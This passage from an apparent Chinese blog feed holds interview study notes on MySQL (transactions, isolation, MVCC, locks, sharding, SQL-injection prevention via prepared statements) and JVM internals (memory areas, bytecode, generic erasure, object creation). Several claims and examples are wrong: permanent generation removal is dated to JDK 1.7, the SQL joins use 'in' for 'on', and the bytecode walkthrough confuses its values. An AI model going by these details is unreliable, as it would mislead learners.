class="headerlink" title="COUNT(列名)和COUNT(*)区别"></a>COUNT(列名)和COUNT(*)区别</h3><p>COUNT(<em>)和COUNT(1)没区别。COUNT(列名)和COUNT(</em>)区别在于前者不会统计列为NULL的数据，后者会统计。</p><h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><h2 id="事务隔离级别？"><a href="#事务隔离级别？" class="headerlink" title="事务隔离级别？"></a>事务隔离级别？</h2><table><thead><tr><th></th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>读未提交</td><td>Y</td><td>Y</td><td>Y</td></tr><tr><td>读已提交</td><td>N</td><td>Y</td><td>Y</td></tr><tr><td>可重复读</td><td>N</td><td>N</td><td>Y</td></tr><tr><td>串行化</td><td>N</td><td>N</td><td>N</td></tr></tbody></table><p> 事务acid性</p><ol><li>l  原子性（Atomicity）：要么全不做要么全做。</li><li>l  一致性（Consistency）：:从一个状态到另一个状态。比如A向B转了钱，转账前后钱的总数不变。</li><li>l  隔离性（Isolation）：并发事务直接不会彼此干扰，多个并发事务之间的数据相互隔离。比如事务A和事务B都修改同一条记录，这条记录就会被重复修改或者后者会覆盖前者的修改记录。</li><li>持久性</li></ol><ol><li>l  脏读：读到另一个事务回滚的数据</li><li>l  不可重复读 在一个事务第一次搜索和第二次搜索结果不一样。</li><li>l  幻读 搜索一共4条记录，修改所有记录的余额时，另一个事务插入一条记录，结果变成修改5条记录.幻读只是重点强调了读取到了之前读取没有获取到的记录。</li></ol><p>不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表</p><ol><li>l  未提交读-避免更新丢失</li><li>l  已提交读-避免脏读</li><li>l  可重复读-避免不可重复读默认</li><li>l  串行化-避免幻读</li></ol><p>一般来说，数据库隔离级别不一样，可能出现的并发问题也不同。级别最高的是串行化，所有问题都不会出现。但是在并发下性能极低，可重复读会只会导致幻读。</p><p>所以<strong>一般使用MySQL默认的可重复读即可</strong>。MVCC（多版本并发控制）使用undo_log使得事务可以读取到数据的快照（某个历史版本），从而实现了可重复读。MySQL采用Next-Key Lock算法，对于索引的扫描不仅是锁住扫描到的索引，还锁住了这些索引覆盖的范围，避免了不可重复读和幻读的产生。</p><h2 id="可重复读是如何实现的？MVCC（多版本并发控制）？"><a href="#可重复读是如何实现的？MVCC（多版本并发控制）？" class="headerlink" title="可重复读是如何实现的？MVCC（多版本并发控制）？"></a>可重复读是如何实现的？MVCC（多版本并发控制）？</h2><p>MVCC（多版本并发控制）multiversion concurrency control的简称，也就是多版本并发控制。     </p><h3 id="版本链"><a href="#版本链" class="headerlink" title="版本链"></a>版本链</h3><p>对该记录每次更新后，都会将旧值放到一条<code>undo日志</code>中，就算是该记录的一个旧版本，旧版本会被<code>roll_pointer</code>（回滚指针）属性连接成一个链表，我们把这个链表称之为<code>版本链</code>，版本链的头节点就是当前记录最新的值。</p><p>如果某个版本的数据对当前事务不可见的话，那就顺着版本链往下找，直到如果最后一个版本也不可见的话，那么就意味着该条记录对该事务完全不可见，查询结果就不包含该记录。</p><p><em>备注：为了支持<code>MVCC</code>，对于<code>delete mark</code>操作来说，仅仅是在记录上打一个删除标记，并没有真正将它删除掉。</em></p><h3 id="read-view"><a href="#read-view" class="headerlink" title="read view"></a>read view</h3><p>InnoDB MVCC使用的内部快照的意思。在不同的隔离级别下，事务启动时（有些情况下，可能是SQL语句开始时）看到的数据快照版本可能也不同</p><ul><li><code>READ UNCOMMITTED</code>由于可以读到未提交事务修改过的记录，所以<strong>直接读取记录的最新版本</strong>就好了；</li><li>READ COMMITTD在<strong>每一次</strong>进行普通SELECT操作前都会生成一个<strong>ReadView</strong>。</li><li>REPEATABLE READ只在<strong>第一次</strong>进行普通SELECT操作前生成一个ReadView，之后的查询操作都重复使用这个ReadView就好了。这就叫<strong>快照读</strong>。其余update、insert、delete操作是是当前读，即先当前读，然后把返回的数据加排他锁，之后执行update。所以，mvvc不能根本上解决幻读的情况</li><li><code>SERIALIZABLE</code>使用<strong>加锁</strong>的方式来访问记录</li></ul><p>READ COMMITTD<code>、</code>REPEATABLE READ`区别：生成ReadView的时机不同，可重复读只需要读到以提交的数据，而可重复读要求第一次读和之后的读都是一样。</p><h2 id="mysql中怎么解决幻读问题？"><a href="#mysql中怎么解决幻读问题？" class="headerlink" title="mysql中怎么解决幻读问题？"></a>mysql中怎么解决幻读问题？</h2><p><code>多版本并发控制 MVCC</code>（读）和 <code>临键锁 Next-Key Lock</code>（写）共同解决了<code>幻读</code>问题。</p><p>临键锁(Next-Key Lock)。是记录锁(<code>Record Lock</code>)和间隙锁（<code>Gap Lock</code>）的组合，既封锁了”缝隙”，又封锁了索引本身。</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>死锁是指两个或两个以上的事务在执行过程中，因争夺锁资源而造成的一种互相等待的现象，若无外力作用两个事务都无法推进，这样就产生了死锁。</p><h3 id="四个必要条件"><a href="#四个必要条件" class="headerlink" title="四个必要条件"></a>四个必要条件</h3><p>四个条件缩写”一保夺环“</p><ol><li>互斥条件：即任何时刻，一个资源只能被一个进程使用。其他进程必须等待。</li><li>请求和保持条件：即当资源请求者在请求其他的资源的同时保持对原有资源的占有且不释放。</li><li>不剥夺条件：资源请求者不能强制从资源占有者手中夺取资源，资源只能由资源占有者主动释放。</li><li>环路等待条件：比如A占有B在等待的资源（B等待A释放），B占有A在等待的资源（A等待B释放）。多个进程循环等待着相邻进程占用着的资源。</li></ol><p>避免死锁可以通过破环四个必要条件之一。</p><h3 id="解决死锁的方法："><a href="#解决死锁的方法：" class="headerlink" title="解决死锁的方法："></a>解决死锁的方法：</h3><p>加锁顺序保持一致。不同的加锁顺序很可能导致死锁，比如哲学家问题：A先申请筷子1在申请筷子2，而B先申请筷子2在申请筷子1，最后谁也得不到一双筷子（同时拥有筷子1和筷子2）</p><p>超时，为其中一个事务设置等待时间，若超过这个阈值事务就回滚，另一个等待的事务就能得以继续执行。比如可重入锁的超时等待</p><p>用<strong>等待图</strong>（wait-for gragh）进行深度优先搜索，如果图中有环路就说明存在死锁。数据库检测出死锁，则选择一个牺牲者放弃事务，一般选择回滚undo量最小的事务。</p><h2 id="数据库中锁？"><a href="#数据库中锁？" class="headerlink" title="数据库中锁？"></a>数据库中锁？</h2><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="数据库"></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/29150809" target="_blank" rel="noopener">MySQL锁总结</a></p></blockquote><h1 id="分库分表"><a href="#分库分表" class="headerlink" title="分库分表"></a>分库分表</h1><p>经验之谈：单表数据量200万、单库并发每秒 1000 （最多2000就一定要分库分表了）</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>并发、磁盘、SQL</p><table><thead><tr><th></th><th>分库分表前</th><th>分库分表后</th></tr></thead><tbody><tr><td>并发支撑情况</td><td>MySQL 单机部署，扛不住高并发</td><td>MySQL从单机到多机，能承受的并发增加了多倍</td></tr><tr><td>磁盘使用情况</td><td>MySQL 单机磁盘容量几乎撑满</td><td>拆分为多个库，数据库服务器磁盘使用率大大降低</td></tr><tr><td>SQL 执行性能</td><td>单表数据量太大，SQL 越跑越慢</td><td>单表数据量减少，SQL 执行效率明显提升</td></tr></tbody></table><h2 id="水平切分"><a href="#水平切分" class="headerlink" title="水平切分"></a>水平切分</h2><p>水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。</p><p>当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。</p><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><ul><li>哈希取模：hash(key) % N；较常用，平均分配每个库的数据量和请求压力，但扩容需要数据迁移，之前的数据需要重新计算 hash 值重新分配到不同的库或表。</li><li>范围：可以是 ID 范围也可以是时间范围；比较简单，给每个月都准备一个库。但容易产生热点问题，大量的流量都打在最新的数据上。</li><li>映射表：使用单独的一个数据库来存储映射关系。</li></ul><h3 id="问题？"><a href="#问题？" class="headerlink" title="问题？"></a>问题？</h3><h4 id="1-事务问题"><a href="#1-事务问题" class="headerlink" title="1. 事务问题"></a>1. 事务问题</h4><p>使用分布式事务来解决，比如 XA 接口。</p><h4 id="2-连接"><a href="#2-连接" class="headerlink" title="2. 连接"></a>2. 连接</h4><p>可以将原来的连接分解成多个单表查询，然后在用户程序中进行连接。</p><h4 id="3-ID-唯一性"><a href="#3-ID-唯一性" class="headerlink" title="3. ID 唯一性"></a>3. ID 唯一性</h4><ul><li>使用全局唯一 ID（GUID）</li><li>为每个分片指定一个 ID 范围</li><li>分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)</li></ul><h2 id="垂直切分"><a href="#垂直切分" class="headerlink" title="垂直切分"></a>垂直切分</h2><p>垂直切分是将一张表按列切分成多个表，通常是按照<strong>列的关系密集程度</strong>进行切分，也可以利用垂直切分将<strong>经常被使用</strong>的列和<strong>不经常被使用</strong>的列切分到不同的表中。</p><p>因为数据库有查询缓存的，字段越少，缓存越多。</p><p>一个大表拆开，订单表、订单支付表、订单商品表。</p><h2 id="常用的分库分表中间件"><a href="#常用的分库分表中间件" class="headerlink" title="常用的分库分表中间件"></a>常用的分库分表中间件</h2><p>中间件可以根据你指定的某个字段值，比如说 userid，<strong>**自动路由到对应的库上去，然后再自动路由到对应的表里去。</strong></p><h3 id="Sharding-jdbc"><a href="#Sharding-jdbc" class="headerlink" title="Sharding-jdbc"></a>Sharding-jdbc</h3><p>当当开源的，属于 client 层方案，支持分库分表、读写分离、分布式 id 生成、柔性事务（最大努力送达型事务、TCC 事务）。</p><p>这种 client 层方案的<strong>优点在于不用部署，运维成本低，不需要代理层的二次转发请求，性能很高</strong>，但是如果遇到升级啥的需要各个系统都重新升级版本再发布，各个系统都需要<strong>耦合</strong> Sharding-jdbc 的依赖；</p><h3 id="Mycat"><a href="#Mycat" class="headerlink" title="Mycat"></a>Mycat</h3><p>基于 Cobar 改造的，属于 proxy 层方案，支功能完善，非常火。但比于 Sharding jdbc 来说，<strong>年轻</strong>一些，。</p><p>Mycat 这种 proxy 层方案的<strong>缺点在于需要部署</strong>，自己运维一套中间件，运维成本高，但是<strong>好处在于对于各个项目是透明的</strong>，如果遇到升级之类的都是自己中间件那里搞就行了。</p><p>两者的主要区别：独立部署、二次转发、耦合度。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ProductStock product = query(&quot;SELECT * FROM tb_product_stock WHERE product_id=#&#123;productId&#125;&quot;, productId);</span><br><span class="line">if (product.getNumber() &gt; 0) &#123;</span><br><span class="line">    updateCnt = update(&quot;UPDATE tb_product_stock SET number=number-1 WHERE product_id=#&#123;productId&#125; AND number=#&#123;number&#125;&quot;, productId, product.getNumber());</span><br><span class="line">                if(updateCnt &gt; 0)&#123;    //更新库存成功</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>使用乐观锁更新库存的时候不加锁，当提交更新时需要判断数据是否已经被修改（AND number=#{number}），只有在 number等于上一次查询到的number时 才提交更新。</p><h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h1><p>内连接为空的值是不会显示出来的 ，但是外连接会<br>group by会按这个值分组，自然这个值就没有重复了。比如班级名</p><p>select * from <code>produce</code> p join <code>category</code>c </p><p>select * from <code>produce</code> p join <code>category</code>c in p.produceId=c.categoryId</p><p>select * from <code>produce</code> p left join <code>category</code>c in p.produceId=c.categoryId</p><h1 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h1><h2 id="慢sql"><a href="#慢sql" class="headerlink" title="慢sql"></a>慢sql</h2><p>分析：开慢日志定位</p><p>使用explain看是不是全表扫描没走索引，extra字段如果是使用“文件排序”或“临时表”</p><p>尽量让它走索引，可以的话就改搜索字段，不能的话只能加索引了。如果是联合索引，要遵循最左匹配原则。</p><p>3）如何实现HashMap顺序存储：可以参考LinkedHashMap的底层实现；</p><h2 id="如何防止SQL注入？"><a href="#如何防止SQL注入？" class="headerlink" title="如何防止SQL注入？"></a>如何防止SQL注入？</h2><p>使用PrepareStatement，可以防止sql注入攻击，sql的执行需要编译，注入问题之所以出现，是因为用户填写 sql语句参与了编译。使用PrepareStatement对象在执行sql语句时，会分为两步，第一步将sql语句 “运送” 到mysql上预编译，再回到java端拿到参数运送到mysql端。<strong>预先编译好，也就是**</strong>SQL<strong>**引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，</strong>无论你输入的是什么，都不会影响该语法结构了**。用户填写的sql语句，就不会参与编译，只会当做参数来看。</p><h2 id="数据库设计的三大范式？"><a href="#数据库设计的三大范式？" class="headerlink" title="数据库设计的三大范式？"></a>数据库设计的三大范式？</h2><p>1NF 不可再分，一个字段里只放一条信息</p><p>2NF， 主键之一就可以完全决定一个属性（表：学号、课程号、姓名、学分;课程号就完全可以决定学分，而学分会相同重复。插入删除异常，有学生才有学分信息，这显然不合理）</p><p>3NF不存在传递依赖，主属性不直接决定非主属性（表: 学号, 姓名, 年龄, 学院名称, 学院电话。学号决定学院，学院直接决定学院电话）</p><blockquote><p><a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" target="_blank" rel="noopener">MySQL索引背后的数据结构及算法原理</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 秋招 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>jvm——秋招复习笔记</title>
      <link href="/2019/10/05/jvm/"/>
      <url>/2019/10/05/jvm/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="jvm运行时数据区？谈谈1-7永久代被移除"><a href="#jvm运行时数据区？谈谈1-7永久代被移除" class="headerlink" title="jvm运行时数据区？谈谈1.7永久代被移除"></a>jvm运行时数据区？谈谈1.7永久代被移除</h2><p>​                                <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/jvm%E7%BB%93%E6%9E%84.png" alt="1564542129113">                 </p><p>程序计数器有两个作用</p><ol><li>字节码解释器通过改变程序计数器的值来实现代码的流程控制</li><li>为了在线程切换后每条线程都能正确回到上次执行的位置，因为每条线程都有自己的程序计数器。</li></ol><p>虚拟机栈是<strong>存放Java方法</strong>内存模型，每个方法在执行时都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接、方法返回地址等信息。方法的开始调用对应着栈帧的进栈，方法执行完成对应这栈帧的出栈。位于栈顶被称为“当前方法”。</p><p>本地方法栈和虚拟机栈类似，不过虚拟机栈针对Java方法，而本地方法栈针对Native方法。</p><p>Java堆。对象实例被分配内存的地方，也是垃圾回收的主要区域。</p><p>方法区。存放被虚拟机加载的<strong>类信息、常量final、静态变量static、即时编译期编译后的代码</strong>。<br>1.7之前方法区是用永久代实现的。<br>这个区域的内存回收目标主要是针对常量池的回收和类型的卸载。<br>运行时常量池是方法区的一部分，运行时常量池是Class文件中的一项信息，存放编译期生成的各种字面量和符号引用。</p><p>常量池在JDK6之前存于永久代中，而后被移动到了堆中，这是因为永久代空间有限，如果频繁创建字符串对象会使得字符串常量池被挤爆，进而引发永久代异常。</p><p>j<strong>dk1.7永久代被移除，</strong> <strong>方法区移至Metaspace，字符串常量移至Java Heap</strong>。元空间的本质和永久代类似，都是对JVM规范中<strong>方法区的实现</strong>。不过元空间与永久代之间最大的区别在于：<strong>元空间并不在虚拟机中，而是使用本地内存</strong>。</p><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E6%96%B9%E6%B3%95%E5%8C%BA.png" alt="1564552178623"></p><p><strong>替换的好处</strong>：一、字符串存在永久代中，容易出现性能问题和内存溢出。而元空间用户内存有多大就可以用多大。</p><p>二、永久代会为 GC 带来不必要的复杂度，并且回收效率偏低</p><h3 id="从一个完整的类来看Java内存结构"><a href="#从一个完整的类来看Java内存结构" class="headerlink" title="从一个完整的类来看Java内存结构"></a>从一个完整的类来看Java内存结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld &#123;</span><br><span class="line">    private String name;//成员变量等类信息存在元空间</span><br><span class="line"></span><br><span class="line">    public void sayHello() &#123;//方法等类信息存在元空间</span><br><span class="line">        System.out.println(&quot;Hello&quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sayHello(String name) &#123;//方法等类信息存在元空间</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;//main对应虚拟机栈中的一个栈帧</span><br><span class="line">        int a=1;//局部变量存在虚拟机栈的局部变量表</span><br><span class="line">        HelloWorld hw=new HelloWorld();//生成的实例存储在堆，此外hw这个地址的引用存在局部变量表</span><br><span class="line">        hw.setName(&quot;test&quot;);//？先生成一个“test”字符串对象，然后把值存在堆中</span><br><span class="line">        hw.sayHello();//调用sayHello方法，对应虚拟机栈中的一个栈帧</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以JDK8来分析</p><p>元空间：HelloWorld的类信息包括成员变量name、方法sayHello和sayHello会存储在元空间；还有System类</p><p>堆：HelloWorld hw=new HelloWorld();会在堆中创建一个HelloWorld的实例；String（“test”）；</p><p>虚拟机栈：“test”引用变量；“hw”保存HelloWorld实例的地址引用变量；局部变量a=1；</p><h2 id="jvm运行时数据区中的堆和栈"><a href="#jvm运行时数据区中的堆和栈" class="headerlink" title="jvm运行时数据区中的堆和栈"></a>jvm运行时数据区中的堆和栈</h2><ul><li><strong>静态存储</strong>——是指在编译时就能够确定每个数据目标在运行时的存储空间需求，因而在编译时就可以给它们分配固定的内存空间。不允许有可变数据结构、嵌套或者递归，因为它们都会导致编译程序无法计算准确的存储空间。</li><li><strong>栈式存储</strong>——该分配可成为动态存储分配，是由一个类似于堆栈的运行栈来实现的，和静态存储的分配方式相反，在栈式存储方案中，程序对数据区的需求在编译时是完全未知的，只有到了运行的时候才能知道，但是规定在运行中进入一个程序模块的时候，必<strong>须知道该程序模块所需要的数据区的大小</strong>才能分配其内存。和我们在数据结构中所熟知的栈一样，栈式存储分配按照先进后出的原则进行分配。</li><li><strong>堆式存储</strong>——堆式存储分配则专门负责在编译时或运行时模块入口处都无法确定存储要求的数据结构的内存分配，比如可变长度串和对象实例，堆由大片的可利用块或空闲块组成，堆中的内存可以按照任意顺序分配和释放。</li></ul><h3 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h3><p>数组或对象在堆创建之后，可以在栈中定义一个特殊的变量，<strong>它取值等于数组或对象在堆内存中的首地址</strong>，栈中的这个变量就成了数组或对象的<strong>引用变量</strong>，它相当于为数组或对象起的一个名称，以后就可以在程序中使用栈中的引用变量来访问堆中的数组或对象。  引用变量相当于为数组或者对象起的一个别名，或者代号。实际上，栈中的变量指向堆内存中的变量，这就是 Java 中的指针。</p><p>引用变量是普通变量，定义时在栈中分配内存，<strong>引用变量在程序运行到作用域外释放</strong>。而数组或对象本身在堆中分配，即使程序运行到使用new产生数组和对象的语句所在地代码块之外，数组和对象本身占用的堆内存也不会被释放，<strong>数组和对象在没有引用变量指向它的时候，才变成垃圾</strong>，不能再被使用，但是仍然占着内存，在随后的一个不确定的时间被垃圾回收器释放掉。</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol><li>管理方式：堆GC回收，栈方法结束自动释放</li><li>存储内容：堆存放对象、栈存放方法</li><li>空间大小：堆比栈大</li><li>碎片相关：堆碎片更多，毕竟栈是一个简单的单向存储结构</li><li>分配方式：堆只支持动态分配，栈支持静态分配和动态分配。</li><li>效率：堆比栈效率低，栈就入栈出栈两个操作</li></ol><h2 id="一个方法被调用的过程？"><a href="#一个方法被调用的过程？" class="headerlink" title="一个方法被调用的过程？"></a>一个方法被调用的过程？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   public  int s() &#123;</span><br><span class="line">      int i=100;</span><br><span class="line">      int j=300;</span><br><span class="line">      int k=i+j;</span><br><span class="line">      return k;</span><br><span class="line">  &#125;</span><br><span class="line">对应的字节码</span><br><span class="line">public int s();</span><br><span class="line">  Code:</span><br><span class="line">     0: bipush        100</span><br><span class="line">     2: istore_1</span><br><span class="line">     3: sipush        300</span><br><span class="line">     6: istore_2</span><br><span class="line">     7: iload_1</span><br><span class="line">     8: iload_2</span><br><span class="line">     9: iadd</span><br><span class="line">    10: istore_3</span><br><span class="line">    11: iload_3</span><br><span class="line">    12: ireturn</span><br></pre></td></tr></table></figure><p>赋值：bipush200被加载进<strong>操作数栈</strong>中，istore将100放入<strong>局部变量表</strong>的第一个Slot中。之后的200也是同样操作。</p><p>操作：iload_1好iload_2将100和200分别被压入<strong>操作数栈</strong>中，iadd两个栈顶元素出栈做<strong>整形加法</strong>，istore_3将300这个结果放入<strong>局部变量表</strong>第三个Slot中，300入操作数栈。ireturn返回。</p><p>整个运算过程中间变量都以操作数栈的入栈出栈作为信息交换途径。</p><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>Java的泛型是伪泛型，<strong>在编译期间</strong>，所有的泛型信息都会被<strong>擦掉</strong>。生成的字节码中是不包含泛型中的类型信息的，使用泛型的时候加上类型参数，在编译器编译的时候会去掉，这个过程成为类型擦除。</p><p>如在代码中定义<code>List&lt;Object&gt;</code>和<code>List&lt;String&gt;</code>等类型，在编译后都会变成<code>List</code>，JVM看到的只是List，而由泛型附加的类型信息对JVM是看不到的。Java编译器会在编译时尽可能的发现可能出错的地方，但是仍然无法在运行时刻出现的类型转换异常的情况，类型擦除也是Java的泛型与C++模板机制实现方式之间的重要区别。</p><h3 id="一个简单问题"><a href="#一个简单问题" class="headerlink" title="一个简单问题"></a>一个简单问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">       ArrayList&lt;String&gt; l1=new ArrayList&lt;&gt;();</span><br><span class="line">       ArrayList&lt;Integer&gt; l2=new ArrayList&lt;&gt;();</span><br><span class="line">       l1.add(&quot;1&quot;);</span><br><span class="line">       l2.add(1);</span><br><span class="line">       System.out.println(l1.getClass()==l1.getClass());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>答案是true，因为泛型会进行类型消除。</p><h3 id="当泛型遇上重载"><a href="#当泛型遇上重载" class="headerlink" title="当泛型遇上重载"></a>当泛型遇上重载</h3><p>​    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(List&lt;String&gt; list)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"method(List&lt;String&gt; list)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"method(List&lt;Integer&gt; list)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译不通过，因为泛型只是语法糖，参数List<string> list和List<integer> list编译之后都被擦除了，变成了一样的原生类型List<e>,擦除动作导致这两种方法的特征签名变得一模一样。</e></integer></string></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">method</span><span class="params">(List&lt;String&gt; list)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"method(List&lt;String&gt; list)"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">method</span><span class="params">(List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"method(List&lt;Integer&gt; list)"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">method(<span class="keyword">new</span> ArrayList&lt;String&gt;());</span><br><span class="line">method(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<br>method(List<string> list)<br>method(List<integer> list)</integer></string></p><p>可见运行成功了。</p><p>两个方法的差别主要在于返回值不同。但是重载必须是两个方法方法签名不同，而与返回值无关，返回值并不包含在方法签名里。所以上面代码并不是发生了方法重载。</p><p>在Class文件格式中，特征签名的范围更大一些，只要描述符（作用是描述方法的参数列表和返回值）不是完全一致的两个方法就可以共存。也就是说，两个方法如果有相同的名称和特征签名，但返回值不同，那它们也是可以合法地共存在一个Class文件中的，只是没有发生重载。</p><h1 id="对象与类"><a href="#对象与类" class="headerlink" title="对象与类"></a>对象与类</h1><h2 id="对象的创建？"><a href="#对象的创建？" class="headerlink" title="对象的创建？"></a>对象的创建？<img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA.png" alt="对象创建"></h2><p><strong>①类加载检查：</strong>首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须<strong>先执行相应的类加载过程。</strong></p><p><strong>②分配内存：</strong> 对象所需的内存大小在类加载完成后便可确定，为对象分配空间的任务等同于把一块确定大小的内存从 Java 堆中划分出来。<strong>分配方式</strong>有 <strong>“指针碰撞”</strong> 和 <strong>“空闲列表”</strong> 两种，<strong>选择那种分配方式由 Java 堆是否规整决定，而Java堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定</strong>。</p><p><strong>③初始化零值：</strong> 将分配到的内存空间都初始化为零值（对象头在下一部初始化），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用。与类加载的初始化零值区别在于，类加载初始化是执行<clinit>方法，即类中所有类变量的赋值动作和static{}，调用前会先执行父类的<clinit>方法。而对象初始化的<init>方法即我们自己写的构造函数，调用前会先执行父类的<init>构造函数。</init></init></clinit></clinit></p><p><strong>④设置对象头：</strong>例如这个对象是那个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 <strong>这些信息存放在对象头中。</strong> 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p><p><strong>⑤执行 init 方法：</strong> 执行<code>&lt;init&gt;</code> 构造方法。</p><h2 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局<img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A6%82%E5%BF%B5.png" alt="多线程概念"></h2><p><strong>对象头</strong>：<strong>Hotspot虚拟机的对象头包括两部分信息</strong>，<strong>第一部分用于存储对象自身的自身运行时数据</strong>（哈希吗、GC分代年龄、锁状态标志等等），<strong>另一部分是类型指针</strong>，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是那个类的实例。Mark Word（标记字段）、Klass Pointer（类型指针）、数组长度数据（可选）</p><p><strong>实例数据：是对象真正存储的有效信息</strong>，也是在程序中所定义的各种类型的字段内容。</p><p><strong>对齐填充</strong>：由于虚拟机要求 对象起始地址必须是8字节的整数倍。填充数据<strong>不是必须的</strong>，仅仅是为了字节对齐；</p><h2 id="对象的访问定位"><a href="#对象的访问定位" class="headerlink" 